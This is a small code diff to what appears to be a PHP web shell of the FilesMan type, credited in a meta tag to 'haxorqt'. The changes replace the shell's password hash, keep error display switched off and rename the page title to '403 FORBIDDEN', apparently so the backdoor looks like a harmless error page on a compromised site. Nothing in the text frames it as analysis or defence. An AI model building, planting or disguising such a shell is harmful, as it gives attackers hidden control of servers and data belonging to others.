@@ -9,7 +9,7 @@ session_start();
 @ini_set('display_errors', 0);
 
 /* konfigurasi */
-$password = "b8af8740de92fb8c8a7e033f648b3753"; //mrmad
+$password = "d400940560caebe16407040021a90d68"; //mrmad
 $default_action = "FilesMan";
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
@@ -126,7 +126,7 @@ header('Content-Type: text/html; charset=UTF-8');
 <!DOCTYPE html>
 <html>
 <head>
-    <title>403 JOEBIDEN</title>
+    <title>403 FORBIDDEN</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="author" content="haxorqt">
